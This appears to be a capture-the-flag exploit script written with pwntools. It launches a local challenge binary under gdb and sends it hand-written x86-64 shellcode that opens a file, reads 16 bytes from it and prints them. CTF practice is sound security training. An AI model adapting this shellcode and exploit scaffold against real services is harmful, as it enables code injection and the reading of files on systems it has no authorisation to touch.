from pwn import *

context.terminal = ['tmux','splitw' ,'-h']
#elf = ELF("./file")
#libc = ELF("./libc.so.6")
#ld_preload = {"LD_PRELOAD": "/home/fresh/libc.so.6"}

#p = process('./chall')
p = gdb.debug('./chall', '''
b *main
b *main+193
''')


padA = b"\x48\xbf\x00\x20\x40\x00\x00\x00\x00\xb8\x02\x00\x00\x00\xbe\x00\x00\x00\x00\x48\x31\xd2\x0f\x05\x50\x48\x83\xec\x10\x48\x8b\x7c\x24\x10\xb8\x00\x00\x00\x00\x48\x89\xe6\xba\x10\x00\x00\x00\x0f\x05\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\x89\xe6\xba\x10\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\x48\x31\xff\x0f\x05"

payload = b""
payload += padA

p.recvline()
p.sendline(payload)
p.interactive()
